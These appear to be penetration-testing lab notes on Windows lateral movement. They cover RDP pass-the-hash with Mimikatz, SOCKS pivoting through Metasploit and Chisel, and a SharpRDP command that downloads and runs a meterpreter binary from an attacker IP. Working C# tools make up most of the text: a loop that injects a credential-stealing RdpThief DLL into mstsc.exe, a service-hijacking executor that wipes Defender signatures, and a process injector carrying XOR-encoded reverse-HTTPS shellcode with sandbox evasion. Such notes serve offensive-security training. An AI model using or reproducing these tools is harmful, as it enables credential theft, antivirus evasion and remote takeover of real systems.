## Windows Lateral Movement

### RDP Lateral Movement

It start the GUI app - Remote Desktop Connetion:
```bat
mstsc.exe
```
We can use /admin flag to connect as admin (if the user is admin), to not disconnect the currently authenticated user.
Once the RDP session is created the NTLM hashes stays in the lsass.exe process until proper logout (in case of the server it is never).

One can protect from caching the credentials by setting the restrictedadmin by suppling the /restrictedadmin flag to mstsc.exe
```bat
mstsc.exe /restrictedadmin
```
The restricted admin is disabled by default, however when the restrctedadmin is enabled we can do pass the hash, since the credentials are not being cached. You can check if restrictedadmin is enabled by examine:
```bat
HKLM:\System\CurrentControlSet\Control\Lsa
# DisableRestrictedAdmin Dword
```

If enabled and you have NTLM hash, you can do pass the hash with Mimikatz or Xfreerdp on Kali:
```bat
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"

# or

xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```

In case you have the ntlm hash, but the restricted admin is disabled, you can enable it by:
1. Starting local Powershell session in the context of the admin user, which is admin on target machine:
```bat
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```
2. Enter the PSH session on remote computer:
```ps1
Enter-PSSession -Computer appsrv01
```
3. Create the DisableRestrictedAdmin registry entry:
```ps1
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```


### Reverse RDP Proxying with MSF

Once the meterpreter is obtained you sent it to the background and do:
```
use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j
```
Now you have the the socks proxy started on the localhost:1080, so you can use proxychains with that:
```
sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf'
proxychains rdesktop IP
```


### Reverse RDP Proxying with Chisel

To compile:
```
go build
# for Windows
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```

Now we need to transfer chisel.exe to the victim machine. On Kali we start the chisel server and configure socks5 proxy with ssh.
```
./chisel server -p 8080 --socks5
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo systemctl start ssh.service
ssh -N -D 0.0.0.0:1080 localhost
```

The on a window victim you run:
```
chisel.exe client 192.168.49.186:8080 socks
```

Then you could use the proxychains.

### RDP as console

mstsc.exe buld upon the mstscax.dll, the library exposes the interface for scripts and compiled code through the COM objects. 
With SharpRDP.exe precompilled, we can do the remote shell without the need of reverse tunnells.
This executes the notepad on the remote system:
```
SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave password=lab
```

You can execute the revese shell easly with powershell, example:
```
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.186/met64.exe', 'C:\Windows\Tasks\met64.exe'); C:\Windows\Tasks\met64.exe" username=corp1\dave password=lab


```

### Stealing clear text creds from RDP

We can do API hooking to hook the mstsc.exe process to grab the creds when the user is typing (no need for global keylogger).
Previously we use frida for that, but we can do the same with custom code with WIN32 APIs.

Hooking API with win32APIs was not covered, however we are given with the unmanaged code written compilled RDPthief.dll.
We would be loading the Dll to the remote process with the following code. It runs in the loop, whenever the mstsc.exe is started it loads the RDP thief to the process.

```cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;


namespace ConsoleAp2
{
    class Program
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
 processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
        dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
  byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
        lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
        dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\RdpThief.dll";
            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.49.186/RdpThief.dll", dllName);

            while (true)
            {
                //processAccess in OpenProcess to 0x01F0FFF
                Process[] mstscProc = Process.GetProcessesByName("mstsc");
                if (mstscProc.Length > 0)
                {
                    for (int i =0; i <mstscProc.Length; i++) { 
                    int pid = mstscProc[i].Id;



                    IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

                    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

                    IntPtr outSize;

                    WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

                    IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");


                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);

                }
                }
                Thread.Sleep(1000);
            }

        }
    }
}

```

The results of the RDPthief can be found under the AppData dir:
```bat
type C:\Users\<username>\AppData\Local\Temp\data.bin
```


### Fileless Lateral Movement


We will be doin here the similar thing that PsExec does, however the PsExec drops the binary for the service to be executed on the disk and then creates new service which is loud. Instead, we would be changing the binary for existing service with the powershell payload (AppLocker might block it, in that case we need certutil or different Applocker bypass). DCE-RPC to access the Service Control Manager to create new service. 

We can use unmanaged API OpenSCManagerW, the authnetication will be handled by Windows in the context of Access Token of executing thread. The we would be using OpenService and ChangeServiceConfigA APIs to open the service and change the service binary. Once that is done we can call StartServiceA. 

PsLessExec.exe code:

```cs
using System;
using System.Runtime.InteropServices;

namespace PSLessExec
{
    public class Program
    {
        public static uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        public static uint SERVICE_ALL_ACCESS = 0xF01FF;
        public static uint SERVICE_DEMAND_START = 0x3;
        public static uint SERVICE_NO_CHANGE = 0xffffffff;

        [StructLayout(LayoutKind.Sequential)]
        public class QUERY_SERVICE_CONFIG
        {
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwServiceType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwStartType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwErrorControl;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpBinaryPathName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpLoadOrderGroup;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwTagID;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDependencies;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpServiceStartName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDisplayName;
        };

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, uint dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        public static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: PSLessExec.exe [Target] [Service] [BinaryToRun]");
                Console.WriteLine("Example: PSLessExec.exe appsrv01 SensorService notepad.exe");
                return;
            }

            // Open remote SCManager
            IntPtr SCMHandle = OpenSCManager(args[0], null, SC_MANAGER_ALL_ACCESS);
            Console.WriteLine($"Got handle on SCManager on {args[0]}: {SCMHandle}.");

            // Access target service
            IntPtr schService = OpenService(SCMHandle, args[1], SERVICE_ALL_ACCESS);
            Console.WriteLine($"Got handle on target service {args[1]}: {schService}.");

            // Get current binPath (two passes, first is to determine the buffer size needed)
            UInt32 dwBytesNeeded;
            QUERY_SERVICE_CONFIG qsc = new QUERY_SERVICE_CONFIG();
            bool bResult = QueryServiceConfig(schService, IntPtr.Zero, 0, out dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            bResult = QueryServiceConfig(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
            Marshal.PtrToStructure(ptr, qsc);
            String binPathOrig = qsc.lpBinaryPathName;

            // Pass 1: Disable Defender signatures
            String defBypass = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, defBypass, null, null, null, null, null, null);
            Console.WriteLine($"Overwrote service executable to become '{defBypass}', result: {bResult}.");

            // Run the service for Pass 1
            bResult = StartService(schService, 0, null);
            Console.WriteLine("Launched service, defender signatures should be wiped.");

            // Pass 2: Run the chosen binary
            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, args[2], null, null, null, null, null, null);
            Console.WriteLine($"Overwrote service executable to become '{args[2]}', result: {bResult}.");

            // Run the service for Pass 2
            bResult = StartService(schService, 0, null);
            Console.WriteLine("Launched service. Check for execution!");

            // Pass 3: Restore original binPath
            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, binPathOrig, null, null, null, null, null, null);
            Console.WriteLine($"Restored service binary to '{binPathOrig}', result: {bResult}.");
        }
    }
}
```

Using this code, we can copy the executable to the disk that performs the Shellcode Injection to the spoolsv process. 

```cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Inject
{
    public class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        public static void Main(string[] args)
        {
            // Sandbox evasion
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // Xor-encoded payload, key 0xfa
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.186 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[698] { 0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xab, 0xac, 0xb2, 0x71, 0xa8, 0xda, 0xb7, 0xcb, 0x33, 0xb2, 0x71, 0x88, 0xaa, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0, 0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8, 0xc6, 0xbb, 0xab, 0xb2, 0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71, 0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0x71, 0xb2, 0xe2, 0xaa, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2, 0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33, 0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf, 0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71, 0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xb2, 0xfb, 0x2a, 0xbb, 0xa2, 0xbb, 0xa2, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2, 0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13, 0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93, 0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d, 0xdc, 0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0xf5, 0xfa, 0xfa, 0xfa, 0xcb, 0xc3, 0xc8, 0xd4, 0xcb, 0xcc, 0xc2, 0xd4, 0xce, 0xc3, 0xd4, 0xcb, 0xc2, 0xcc, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d, 0x3a, 0x41, 0xfb, 0xfa, 0xfa, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3, 0x40, 0xad, 0x73, 0x65, 0x3c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x75, 0xfa, 0xfa, 0xfa, 0xd5, 0x8c, 0x9b, 0xd7, 0x91, 0x9b, 0xc9, 0xb4, 0xce, 0xb6, 0xa5, 0xac, 0xaa, 0xbb, 0xaf, 0xce, 0xbe, 0xb6, 0x95, 0xc2, 0x9c, 0xa0, 0xab, 0xa0, 0xa9, 0x99, 0x98, 0xb4, 0xb9, 0xb7, 0xa8, 0x80, 0xa3, 0x89, 0xcb, 0xcf, 0xb5, 0xbe, 0xbf, 0xbc, 0xcb, 0xbc, 0xa3, 0xab, 0xac, 0xbe, 0xb0, 0xbd, 0xad, 0xad, 0xca, 0xad, 0xb0, 0xa2, 0xc8, 0xbc, 0xbe, 0xad, 0xbc, 0x8f, 0xbe, 0x93, 0xb7, 0xac, 0xc2, 0xa3, 0xc3, 0x8c, 0xb9, 0xb7, 0x9f, 0x9f, 0xb5, 0xaa, 0x8f, 0xbb, 0x9e, 0x8f, 0x8f, 0x89, 0xb2, 0x8e, 0xab, 0x93, 0x96, 0x89, 0xbe, 0x8f, 0x88, 0xbe, 0xb7, 0xb0, 0xb4, 0xce, 0xca, 0x8e, 0xb4, 0x94, 0x82, 0xcd, 0xa9, 0xc8, 0x92, 0xb8, 0xa8, 0xaf, 0xaa, 0x9e, 0x92, 0x93, 0x96, 0xbc, 0xb7, 0x92, 0x91, 0xac, 0xbb, 0x9c, 0xcb, 0xaa, 0xcf, 0x88, 0xbf, 0xa2, 0x8f, 0x95, 0xac, 0x96, 0x95, 0xb3, 0x88, 0xb2, 0x8e, 0x8b, 0xc9, 0xb7, 0xa3, 0xae, 0xc3, 0xca, 0xcc, 0x89, 0xfa, 0xb2, 0x73, 0x3b, 0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb, 0x33, 0xa9, 0xb2, 0x42, 0xfa, 0xc8, 0x52, 0x7e, 0xfa, 0xfa, 0xfa, 0xfa, 0xaa, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 0xb2, 0x73, 0x3c, 0x90, 0xf0, 0xa5, 0xb2, 0x73, 0x0b, 0x90, 0xe5, 0xa0, 0xa8, 0x92, 0x7a, 0xc9, 0xfa, 0xfa, 0xb3, 0x73, 0x1a, 0x90, 0xfe, 0xbb, 0xa3, 0xb3, 0x40, 0x8f, 0xbc, 0x64, 0x7c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb7, 0xcb, 0x3a, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81, 0x05, 0x2f, 0x7f, 0x3a, 0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3, 0x40, 0xbe, 0x0a, 0xcf, 0x1a, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35, 0x8e, 0xf8, 0x11, 0x50, 0x12, 0xaf, 0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0, 0xb3, 0x73, 0x2b, 0x3b, 0x18, 0xea, 0xb3, 0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3, 0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9, 0xa9, 0xb2, 0x73, 0x1d, 0xb2, 0x73, 0x0b, 0xb2, 0x73, 0x20, 0xb3, 0x3d, 0x3a, 0xfa, 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03, 0xb3, 0x40, 0xe8, 0x6c, 0x73, 0x18, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda, 0x7f, 0x3a, 0x8e, 0x48, 0x9c, 0x71, 0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2, 0x39, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05, 0x2f };



            int len = buf.Length;

            // Parse arguments, if given (process to inject)
            String procName = "";
            if (args.Length == 1)
            {
                procName = args[0];
            }
            else if (args.Length == 0)
            {
                // Inject based on elevation level
                if (IsElevated)
                {
                    Console.WriteLine("Process is elevated.");
                    procName = "spoolsv";
                }
                else
                {
                    Console.WriteLine("Process is not elevated.");
                    procName = "explorer";
                }
            }
            else
            {
                Console.WriteLine("Please give either one argument for a process to inject, e.g. \".\\Inject.exe explorer\", or leave empty for auto-injection.");
                return;
            }

            Console.WriteLine($"Attempting to inject into {procName} process...");

            // Get process IDs
            Process[] expProc = Process.GetProcessesByName(procName);

            // If multiple processes exist, try to inject in all of them
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // Get a handle on the process
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // Allocate memory in the remote process
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // Decode the payload
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0xfa);
                }

                // Write the payload to the allocated bytes
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                break;
            }
        }
    }
}

```